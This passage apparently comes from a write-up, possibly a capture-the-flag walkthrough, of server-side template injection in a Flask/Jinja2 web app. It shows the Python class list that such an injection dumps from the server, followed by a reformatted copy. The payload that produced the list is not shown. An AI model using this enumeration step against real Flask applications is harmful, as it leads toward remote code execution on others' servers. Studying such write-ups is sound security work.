&#39;pkg<em>resources.</em>vendor.pyparsing.ParserElement.<em>FifoCache&#39;&gt;, &lt;class &#39;pkg</em>resources.<em>vendor.pyparsing.ParserElement&#39;&gt;, &lt;class &#39;pkg</em>resources.<em>vendor.pyparsing.</em>NullToken&#39;&gt;, &lt;class &#39;pkg<em>resources.</em>vendor.pyparsing.OnlyOnce&#39;&gt;, &lt;class &#39;pkg<em>resources.</em>vendor.pyparsing.pyparsing<em>common&#39;&gt;, &lt;class &#39;pkg</em>resources.extern.packaging.markers.Node&#39;&gt;, &lt;class &#39;pkg<em>resources.extern.packaging.markers.Marker&#39;&gt;, &lt;class &#39;pkg</em>resources.extern.packaging.requirements.Requirement&#39;&gt;, &lt;class &#39;pkg<em>resources.IMetadataProvider&#39;&gt;, &lt;class &#39;pkg</em>resources.WorkingSet&#39;&gt;, &lt;class &#39;pkg<em>resources.Environment&#39;&gt;, &lt;class &#39;pkg</em>resources.ResourceManager&#39;&gt;, &lt;class &#39;pkg<em>resources.NullProvider&#39;&gt;, &lt;class &#39;pkg</em>resources.NoDists&#39;&gt;, &lt;class &#39;pkg<em>resources.EntryPoint&#39;&gt;, &lt;class &#39;pkg</em>resources.Distribution&#39;&gt;, &lt;class &#39;gunicorn.six.<em>LazyDescr&#39;&gt;, &lt;class &#39;gunicorn.six.</em>SixMetaPathImporter&#39;&gt;, &lt;class &#39;logging.LogRecord&#39;&gt;, &lt;class &#39;logging.PercentStyle&#39;&gt;, &lt;class &#39;logging.Formatter&#39;&gt;, &lt;class &#39;logging.BufferingFormatter&#39;&gt;, &lt;class &#39;logging.Filter&#39;&gt;, &lt;class &#39;logging.Filterer&#39;&gt;, &lt;class &#39;logging.PlaceHolder&#39;&gt;, &lt;class &#39;logging.Manager&#39;&gt;, &lt;class &#39;logging.LoggerAdapter&#39;&gt;, &lt;class &#39;gunicorn.pidfile.Pidfile&#39;&gt;, &lt;class &#39;gunicorn.sock.BaseSocket&#39;&gt;, &lt;class &#39;gunicorn.arbiter.Arbiter&#39;&gt;, &lt;class &#39;gettext.NullTranslations&#39;&gt;, &lt;class &#39;argparse.<em>AttributeHolder&#39;&gt;, &lt;class &#39;argparse.HelpFormatter.</em>Section&#39;&gt;, &lt;class &#39;argparse.HelpFormatter&#39;&gt;, &lt;class &#39;argparse.FileType&#39;&gt;, &lt;class &#39;argparse.<em>ActionsContainer&#39;&gt;, &lt;class &#39;</em>ssl.<em>SSLContext&#39;&gt;, &lt;class &#39;</em>ssl.<em>SSLSocket&#39;&gt;, &lt;class &#39;</em>ssl.MemoryBIO&#39;&gt;, &lt;class &#39;<em>ssl.Session&#39;&gt;, &lt;class &#39;ssl.SSLObject&#39;&gt;, &lt;class &#39;shlex.shlex&#39;&gt;, &lt;class &#39;gunicorn.reloader.InotifyReloader&#39;&gt;, &lt;class &#39;gunicorn.config.Config&#39;&gt;, &lt;class &#39;gunicorn.config.Setting&#39;&gt;, &lt;class &#39;gunicorn.debug.Spew&#39;&gt;, &lt;class &#39;gunicorn.app.base.BaseApplication&#39;&gt;, &lt;class &#39;pickle.</em>Framer&#39;&gt;, &lt;class &#39;pickle.<em>Unframer&#39;&gt;, &lt;class &#39;pickle.</em>Pickler&#39;&gt;, &lt;class &#39;pickle.<em>Unpickler&#39;&gt;, &lt;class &#39;</em>pickle.Unpickler&#39;&gt;, &lt;class &#39;<em>pickle.Pickler&#39;&gt;, &lt;class &#39;</em>pickle.Pdata&#39;&gt;, &lt;class &#39;<em>pickle.PicklerMemoProxy&#39;&gt;, &lt;class &#39;</em>pickle.UnpicklerMemoProxy&#39;&gt;, &lt;class &#39;<em>queue.SimpleQueue&#39;&gt;, &lt;class &#39;queue.Queue&#39;&gt;, &lt;class &#39;queue.</em>PySimpleQueue&#39;&gt;, &lt;class &#39;logging.handlers.QueueListener&#39;&gt;, &lt;class &#39;socketserver.BaseServer&#39;&gt;, &lt;class &#39;socketserver.ForkingMixIn&#39;&gt;, &lt;class &#39;socketserver.ThreadingMixIn&#39;&gt;, &lt;class &#39;socketserver.BaseRequestHandler&#39;&gt;, &lt;class &#39;logging.config.ConvertingMixin&#39;&gt;, &lt;class &#39;logging.config.BaseConfigurator&#39;&gt;, &lt;class &#39;gunicorn.glogging.Logger&#39;&gt;, &lt;class &#39;gunicorn.http.unreader.Unreader&#39;&gt;, &lt;class &#39;gunicorn.http.body.ChunkedReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.LengthReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.EOFReader&#39;&gt;, &lt;class &#39;gunicorn.http.body.Body&#39;&gt;, &lt;class &#39;gunicorn.http.message.Message&#39;&gt;, &lt;class &#39;gunicorn.http.parser.Parser&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;gunicorn.http.wsgi.Response&#39;&gt;, &lt;class &#39;gunicorn.workers.workertmp.WorkerTmp&#39;&gt;, &lt;class &#39;gunicorn.workers.base.Worker&#39;&gt;, &lt;class &#39;concurrent.futures.<em>base.</em>Waiter&#39;&gt;, &lt;class &#39;concurrent.futures.<em>base.</em>AcquireFutures&#39;&gt;, &lt;class &#39;concurrent.futures.<em>base.Future&#39;&gt;, &lt;class &#39;concurrent.futures.</em>base.Executor&#39;&gt;, &lt;class &#39;asyncio.coroutines.CoroWrapper&#39;&gt;, &lt;class &#39;asyncio.events.Handle&#39;&gt;, &lt;class &#39;asyncio.events.AbstractServer&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoop&#39;&gt;, &lt;class &#39;asyncio.events.AbstractEventLoopPolicy&#39;&gt;, &lt;class &#39;<em>asyncio.Future&#39;&gt;, &lt;class &#39;</em>asyncio.FutureIter&#39;&gt;, &lt;class &#39;TaskStepMethWrapper&#39;&gt;, &lt;class &#39;TaskWakeupMethWrapper&#39;&gt;, &lt;class &#39;<em>RunningLoopHolder&#39;&gt;, &lt;class &#39;asyncio.futures.Future&#39;&gt;, &lt;class &#39;asyncio.protocols.BaseProtocol&#39;&gt;, &lt;class &#39;asyncio.transports.BaseTransport&#39;&gt;, &lt;class &#39;asyncio.sslproto.</em>SSLPipe&#39;&gt;, &lt;class &#39;asyncio.locks.<em>ContextManager&#39;&gt;, &lt;class &#39;asyncio.locks.</em>ContextManagerMixin&#39;&gt;, &lt;class &#39;asyncio.locks.Event&#39;&gt;, &lt;class &#39;asyncio.queues.Queue&#39;&gt;, &lt;class &#39;asyncio.streams.StreamWriter&#39;&gt;, &lt;class &#39;asyncio.streams.StreamReader&#39;&gt;, &lt;class &#39;asyncio.subprocess.Process&#39;&gt;, &lt;class &#39;asyncio.unix<em>events.AbstractChildWatcher&#39;&gt;, &lt;class &#39;gunicorn.selectors.BaseSelector&#39;&gt;, &lt;class &#39;gunicorn.workers.gthread.TConn&#39;&gt;, &lt;class &#39;concurrent.futures.thread.</em>WorkItem&#39;&gt;, &lt;class &#39;<em>ast.AST&#39;&gt;, &lt;class &#39;</em>json.Scanner&#39;&gt;, &lt;class &#39;<em>json.Encoder&#39;&gt;, &lt;class &#39;json.decoder.JSONDecoder&#39;&gt;, &lt;class &#39;json.encoder.JSONEncoder&#39;&gt;, &lt;class &#39;jinja2.utils.MissingType&#39;&gt;, &lt;class &#39;jinja2.utils.LRUCache&#39;&gt;, &lt;class &#39;jinja2.utils.Cycler&#39;&gt;, &lt;class &#39;jinja2.utils.Joiner&#39;&gt;, &lt;class &#39;jinja2.utils.Namespace&#39;&gt;, &lt;class &#39;markupsafe.</em>MarkupEscapeHelper&#39;&gt;, &lt;class &#39;jinja2.nodes.EvalContext&#39;&gt;, &lt;class &#39;jinja2.nodes.Node&#39;&gt;, &lt;class &#39;jinja2.runtime.TemplateReference&#39;&gt;, &lt;class &#39;jinja2.runtime.Context&#39;&gt;, &lt;class &#39;jinja2.runtime.BlockReference&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextBase&#39;&gt;, &lt;class &#39;jinja2.runtime.LoopContextIterator&#39;&gt;, &lt;class &#39;jinja2.runtime.Macro&#39;&gt;, &lt;class &#39;jinja2.runtime.Undefined&#39;&gt;, &lt;class &#39;decimal.Decimal&#39;&gt;, &lt;class &#39;decimal.Context&#39;&gt;, &lt;class &#39;decimal.SignalDictMixin&#39;&gt;, &lt;class &#39;decimal.ContextManager&#39;&gt;, &lt;class &#39;numbers.Number&#39;&gt;, &lt;class &#39;jinja2.lexer.Failure&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStreamIterator&#39;&gt;, &lt;class &#39;jinja2.lexer.TokenStream&#39;&gt;, &lt;class &#39;jinja2.lexer.Lexer&#39;&gt;, &lt;class &#39;jinja2.parser.Parser&#39;&gt;, &lt;class &#39;jinja2.visitor.NodeVisitor&#39;&gt;, &lt;class &#39;jinja2.idtracking.Symbols&#39;&gt;, &lt;class &#39;jinja2.compiler.MacroRef&#39;&gt;, &lt;class &#39;jinja2.compiler.Frame&#39;&gt;, &lt;class &#39;jinja2.environment.Environment&#39;&gt;, &lt;class &#39;jinja2.environment.Template&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateModule&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateExpression&#39;&gt;, &lt;class &#39;jinja2.environment.TemplateStream&#39;&gt;, &lt;class &#39;jinja2.loaders.BaseLoader&#39;&gt;, &lt;class &#39;jinja2.bccache.Bucket&#39;&gt;, &lt;class &#39;jinja2.bccache.BytecodeCache&#39;&gt;, &lt;class &#39;jinja2.asyncsupport.AsyncLoopContextIterator&#39;&gt;, &lt;class &#39;werkzeug.<em>internal.</em>Missing&#39;&gt;, &lt;class &#39;werkzeug.<em>internal.</em>DictAccessorProperty&#39;&gt;, &lt;class &#39;werkzeug.utils.HTMLBuilder&#39;&gt;, &lt;class &#39;werkzeug.exceptions.Aborter&#39;&gt;, &lt;class &#39;werkzeug.urls.Href&#39;&gt;, &lt;class &#39;email.message.Message&#39;&gt;, &lt;class &#39;http.client.HTTPConnection&#39;&gt;, &lt;class &#39;mimetypes.MimeTypes&#39;&gt;, &lt;class &#39;werkzeug.serving.WSGIRequestHandler&#39;&gt;, &lt;class &#39;werkzeug.serving.<em>SSLContext&#39;&gt;, &lt;class &#39;werkzeug.serving.BaseWSGIServer&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableListMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.UpdateDictMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ViewItems&#39;&gt;, &lt;class &#39;werkzeug.datastructures.</em>omd<em>bucket&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Headers&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ImmutableHeadersMixin&#39;&gt;, &lt;class &#39;werkzeug.datastructures.IfRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.Range&#39;&gt;, &lt;class &#39;werkzeug.datastructures.ContentRange&#39;&gt;, &lt;class &#39;werkzeug.datastructures.FileStorage&#39;&gt;, &lt;class &#39;urllib.request.Request&#39;&gt;, &lt;class &#39;urllib.request.OpenerDirector&#39;&gt;, &lt;class &#39;urllib.request.BaseHandler&#39;&gt;, &lt;class &#39;urllib.request.HTTPPasswordMgr&#39;&gt;, &lt;class &#39;urllib.request.AbstractBasicAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.AbstractDigestAuthHandler&#39;&gt;, &lt;class &#39;urllib.request.URLopener&#39;&gt;, &lt;class &#39;urllib.request.ftpwrapper&#39;&gt;, &lt;class &#39;werkzeug.wrappers.accept.AcceptMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.AuthorizationMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.auth.WWWAuthenticateMixin&#39;&gt;, &lt;class &#39;werkzeug.wsgi.ClosingIterator&#39;&gt;, &lt;class &#39;werkzeug.wsgi.FileWrapper&#39;&gt;, &lt;class &#39;werkzeug.wsgi.</em>RangeWrapper&#39;&gt;, &lt;class &#39;werkzeug.formparser.FormDataParser&#39;&gt;, &lt;class &#39;werkzeug.formparser.MultiPartParser&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base<em>request.BaseRequest&#39;&gt;, &lt;class &#39;werkzeug.wrappers.base</em>response.BaseResponse&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common<em>descriptors.CommonRequestDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.common</em>descriptors.CommonResponseDescriptorsMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagRequestMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.etag.ETagResponseMixin&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgentParser&#39;&gt;, &lt;class &#39;werkzeug.useragents.UserAgent&#39;&gt;, &lt;class &#39;werkzeug.wrappers.user<em>agent.UserAgentMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.request.StreamOnlyMixin&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStream&#39;&gt;, &lt;class &#39;werkzeug.wrappers.response.ResponseStreamMixin&#39;&gt;, &lt;class &#39;http.cookiejar.Cookie&#39;&gt;, &lt;class &#39;http.cookiejar.CookiePolicy&#39;&gt;, &lt;class &#39;http.cookiejar.Absent&#39;&gt;, &lt;class &#39;http.cookiejar.CookieJar&#39;&gt;, &lt;class &#39;werkzeug.test.</em>TestCookieHeaders&#39;&gt;, &lt;class &#39;werkzeug.test.<em>TestCookieResponse&#39;&gt;, &lt;class &#39;werkzeug.test.EnvironBuilder&#39;&gt;, &lt;class &#39;werkzeug.test.Client&#39;&gt;, &lt;class &#39;uuid.UUID&#39;&gt;, &lt;class &#39;itsdangerous.</em>json.<em>CompactJSON&#39;&gt;, &lt;class &#39;hmac.HMAC&#39;&gt;, &lt;class &#39;itsdangerous.signer.SigningAlgorithm&#39;&gt;, &lt;class &#39;itsdangerous.signer.Signer&#39;&gt;, &lt;class &#39;itsdangerous.serializer.Serializer&#39;&gt;, &lt;class &#39;itsdangerous.url</em>safe.URLSafeSerializerMixin&#39;&gt;, &lt;class &#39;flask.<em>compat.</em>DeprecatedBool&#39;&gt;, &lt;class &#39;greenlet.greenlet&#39;&gt;, &lt;class &#39;werkzeug.local.Local&#39;&gt;, &lt;class &#39;werkzeug.local.LocalStack&#39;&gt;, &lt;class &#39;werkzeug.local.LocalManager&#39;&gt;, &lt;class &#39;werkzeug.local.LocalProxy&#39;&gt;, &lt;class &#39;dataclasses.<em>HAS</em>DEFAULT<em>FACTORY</em>CLASS&#39;&gt;, &lt;class &#39;dataclasses.<em>MISSING</em>TYPE&#39;&gt;, &lt;class &#39;dataclasses.<em>FIELD</em>BASE&#39;&gt;, &lt;class &#39;dataclasses.InitVar&#39;&gt;, &lt;class &#39;dataclasses.Field&#39;&gt;, &lt;class &#39;dataclasses.<em>DataclassParams&#39;&gt;, &lt;class &#39;ast.NodeVisitor&#39;&gt;, &lt;class &#39;difflib.SequenceMatcher&#39;&gt;, &lt;class &#39;difflib.Differ&#39;&gt;, &lt;class &#39;difflib.HtmlDiff&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleFactory&#39;&gt;, &lt;class &#39;werkzeug.routing.RuleTemplate&#39;&gt;, &lt;class &#39;werkzeug.routing.BaseConverter&#39;&gt;, &lt;class &#39;werkzeug.routing.Map&#39;&gt;, &lt;class &#39;werkzeug.routing.MapAdapter&#39;&gt;, &lt;class &#39;click.</em>compat.<em>FixupStream&#39;&gt;, &lt;class &#39;click.</em>compat.<em>AtomicFile&#39;&gt;, &lt;class &#39;click.utils.LazyFile&#39;&gt;, &lt;class &#39;click.utils.KeepOpenFile&#39;&gt;, &lt;class &#39;click.utils.PacifyFlushWrapper&#39;&gt;, &lt;class &#39;click.types.ParamType&#39;&gt;, &lt;class &#39;click.parser.Option&#39;&gt;, &lt;class &#39;click.parser.Argument&#39;&gt;, &lt;class &#39;click.parser.ParsingState&#39;&gt;, &lt;class &#39;click.parser.OptionParser&#39;&gt;, &lt;class &#39;click.formatting.HelpFormatter&#39;&gt;, &lt;class &#39;click.core.Context&#39;&gt;, &lt;class &#39;click.core.BaseCommand&#39;&gt;, &lt;class &#39;click.core.Parameter&#39;&gt;, &lt;class &#39;flask.signals.Namespace&#39;&gt;, &lt;class &#39;flask.signals.</em>FakeSignal&#39;&gt;, &lt;class &#39;flask.helpers.locked<em>cached</em>property&#39;&gt;, &lt;class &#39;flask.helpers.<em>PackageBoundObject&#39;&gt;, &lt;class &#39;flask.cli.DispatchingApp&#39;&gt;, &lt;class &#39;flask.cli.ScriptInfo&#39;&gt;, &lt;class &#39;flask.config.ConfigAttribute&#39;&gt;, &lt;class &#39;flask.ctx.</em>AppCtxGlobals&#39;&gt;, &lt;class &#39;flask.ctx.AppContext&#39;&gt;, &lt;class &#39;flask.ctx.RequestContext&#39;&gt;, &lt;class &#39;flask.json.tag.JSONTag&#39;&gt;, &lt;class &#39;flask.json.tag.TaggedJSONSerializer&#39;&gt;, &lt;class &#39;flask.sessions.SessionInterface&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.<em>JSONModule&#39;&gt;, &lt;class &#39;werkzeug.wrappers.json.JSONMixin&#39;&gt;, &lt;class &#39;flask.blueprints.BlueprintSetupState&#39;&gt;, &lt;class &#39;typing.</em>Final&#39;&gt;, &lt;class &#39;typing.<em>Immutable&#39;&gt;, &lt;class &#39;typing.Generic&#39;&gt;, &lt;class &#39;typing.</em>TypingEmpty&#39;&gt;, &lt;class &#39;typing.<em>TypingEllipsis&#39;&gt;, &lt;class &#39;typing.NamedTuple&#39;&gt;, &lt;class &#39;typing.io&#39;&gt;, &lt;class &#39;typing.re&#39;&gt;, &lt;class &#39;six.</em>LazyDescr&#39;&gt;, &lt;class &#39;six.<em>SixMetaPathImporter&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.AsymmetricSignatureContext&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.AsymmetricVerificationContext&#39;&gt;, &lt;class &#39;unicodedata.UCD&#39;&gt;, &lt;class &#39;asn1crypto.util.extended</em>date&#39;&gt;, &lt;class &#39;asn1crypto.util.extended<em>datetime&#39;&gt;, &lt;class &#39;CArgObject&#39;&gt;, &lt;class &#39;</em>ctypes.CThunkObject&#39;&gt;, &lt;class &#39;<em>ctypes.</em>CData&#39;&gt;, &lt;class &#39;<em>ctypes.CField&#39;&gt;, &lt;class &#39;</em>ctypes.DictRemover&#39;&gt;, &lt;class &#39;ctypes.CDLL&#39;&gt;, &lt;class &#39;ctypes.LibraryLoader&#39;&gt;, &lt;class &#39;asn1crypto.core.Asn1Value&#39;&gt;, &lt;class &#39;asn1crypto.core.ValueMap&#39;&gt;, &lt;class &#39;asn1crypto.core.Castable&#39;&gt;, &lt;class &#39;asn1crypto.core.Constructable&#39;&gt;, &lt;class &#39;asn1crypto.core.Concat&#39;&gt;, &lt;class &#39;asn1crypto.core.BitString&#39;&gt;, &lt;class &#39;asn1crypto.algos.<em>ForceNullParameters&#39;&gt;, &lt;class &#39;cryptography.utils.</em>DeprecatedValue&#39;&gt;, &lt;class &#39;cryptography.utils.<em>ModuleWithDeprecations&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.CipherBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.HashBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.HMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.CMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.PBKDF2HMACBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.RSABackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DSABackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.EllipticCurveBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.PEMSerializationBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DERSerializationBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.X509Backend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.DHBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.backends.interfaces.ScryptBackend&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.HashAlgorithm&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.HashContext&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.ExtendableOutputFunction&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.Hash&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512</em>224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512<em>256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA384&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA512&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3</em>224&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3<em>256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3</em>384&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHA3<em>512&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHAKE128&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.SHAKE256&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.MD5&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.BLAKE2b&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.hashes.BLAKE2s&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.utils.Prehashed&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.KeySerializationEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.BestAvailableEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.serialization.base.NoEncryption&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAParameters&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAParameterNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.</em>oid.ObjectIdentifier&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveOID&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurve&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveSignatureAlgorithm&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT571R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT409R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT283R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT233R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT163R2&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT571K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT409K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT283K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT233K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECT163K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP521R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP384R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP256R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP256K1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP224R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.SECP192R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP256R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP384R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP512R1&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.ECDSA&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ec.ECDH&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicNumbers&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.AsymmetricPadding&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.PKCS1v15&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.PSS&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.OAEP&#39;&gt;, &lt;class &#39;cryptography.hazmat.primitives.asymmetric.padding.MGF1&#39;&gt;, &lt;class &#39;jwt.algorithms.Algorithm&#39;&gt;, &lt;class &#39;jwt.api<em>jws.PyJWS&#39;&gt;, &lt;class &#39;jinja2.ext.Extension&#39;&gt;, &lt;class &#39;jinja2.ext.</em>CommentFinder&#39;&gt;, &lt;class &#39;jinja2.debug.TracebackFrameProxy&#39;&gt;, &lt;class &#39;jinja2.debug.ProcessedTraceback&#39;&gt;]</span></h1>
+    </div>
+</body></p>
+
+<script src="/static/js/snow.js"></script>
+
+<p>```</p>
+
+<p>Here the list of classes in a more readable way.</p>
+
+<p><code>python
+[&lt;class 'type'&gt;, 
+&lt;class 'weakref'&gt;, 
+&lt;class 'weakcallableproxy'&gt;, 
+&lt;class 'weakproxy'&gt;, 
+&lt;class 'int'&gt;, 
+&lt;class 'bytearray'&gt;, 
+&lt;class 'bytes'&gt;, 
+&lt;class 'list'&gt;, 
+&lt;class 'NoneType'&gt;, 
+&lt;class 'NotImplementedType'&gt;, 
+&lt;class 'traceback'&gt;, 
+&lt;class 'super'&gt;, 
+&lt;class 'range'&gt;, 
+&lt;class 'dict'&gt;, 
+&lt;class 'dict_keys'&gt;, 
+&lt;class 'dict_values'&gt;, 
+&lt;class 'dict_items'&gt;, 
+&lt;class 'odict_iterator'&gt;, 
+&lt;class 'set'&gt;, 
+&lt;class 'str'&gt;, 
+&lt;class 'slice'&gt;, 
+&lt;class 'staticmethod'&gt;, 
+&lt;class 'complex'&gt;, 
+&lt;class 'float'&gt;, 
+&lt;class 'frozenset'&gt;, 
+&lt;class 'property'&gt;, 
+&lt;class 'managedbuffer'&gt;, 
+&lt;class 'memoryview'&gt;, 
+&lt;class 'tuple'&gt;, 
+&lt;class 'enumerate'&gt;, 
+&lt;class 'reversed'&gt;, 
+&lt;class 'stderrprinter'&gt;, 
+&lt;class 'code'&gt;, 
+&lt;class 'frame'&gt;, 
+&lt;class 'builtin_function_or_method'&gt;, 
+&lt;class 'method'&gt;, 
+&lt;class 'function'&gt;, 
+&lt;class 'mappingproxy'&gt;, 
+&lt;class 'generator'&gt;, 
+&lt;class 'getset_descriptor'&gt;, 
+&lt;class 'wrapper_descriptor'&gt;, 
+&lt;class 'method-wrapper'&gt;, 
+&lt;class 'ellipsis'&gt;, 
+&lt;class 'member_descriptor'&gt;, 
+&lt;class 'types.SimpleNamespace'&gt;, 
+&lt;class 'PyCapsule'&gt;, 
+&lt;class 'longrange_iterator'&gt;, 
+&lt;class 'cell'&gt;, 
+&lt;class 'instancemethod'&gt;, 
+&lt;class 'classmethod_descriptor'&gt;, 
+&lt;class 'method_descriptor'&gt;, 
+&lt;class 'callable_iterator'&gt;, 
+&lt;class 'iterator'&gt;, 
+&lt;class 'coroutine'&gt;, 
